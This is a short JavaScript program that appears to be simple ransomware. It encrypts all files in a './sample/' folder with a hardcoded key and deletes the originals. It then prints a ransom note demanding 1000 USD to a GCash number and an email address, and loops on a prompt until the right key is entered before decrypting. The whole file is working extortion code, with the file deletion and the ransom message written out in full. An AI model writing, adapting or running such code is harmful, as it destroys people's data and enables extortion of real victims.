const encryptor = require('file-encryptor');
const fs = require('fs');
const readlineSync = require('readline-sync');

const encryptionKey = 'wala ng libre ngayun!';
const testFolder = './sample/';

(async () => {

    const files = fs.readdirSync(testFolder);

    for (const file of files) {
        // Encrypt file.
        await new Promise((resolve, reject) => {
            encryptor.encryptFile(`${testFolder}/${file}`, `${testFolder}/${file}.encrypted`, encryptionKey, async function(err) {
                if (err) {
                    reject(err);
                } else {
                    await fs.unlinkSync(`${testFolder}/${file}`);
                    console.log(`File ${testFolder}/${file} is encrypted!`);
                    resolve();
                }
            });
        });
    }

    console.log('Oh no! an unknown Virus has infected your files, Pay me 1000 USD in my gcash number:09123456789 to fix the problem,\nSend proof of payment in this email: VIRUSLAYER@gmail.com')

    let decryptionKey;
    let decryptSuccess = false;

    while (!decryptSuccess) {
        // Wait for user's response.
        decryptionKey = readlineSync.question('ENTER DECRYPTION KEY: ');

        if (decryptionKey === encryptionKey) {
            decryptSuccess = true;
        } else {
            console.log("Decryption key is incorrect. Please try again.");
        }
    }

    const encryptedFiles = fs.readdirSync(testFolder);

    for (const file of encryptedFiles) {
        // Decrypt file.
        await new Promise((resolve, reject) => {
            encryptor.decryptFile(`${testFolder}/${file}`, `${testFolder}/${file.replace('.encrypted', '')}`, encryptionKey, async function(err) {
                if (err) {
                    reject(err);
                } else {
                    await fs.unlinkSync(`${testFolder}/${file}`);
                    console.log(`File ${testFolder}/${file} is decrypted!`);
                    resolve();
                }
            });
        });
    }
})();
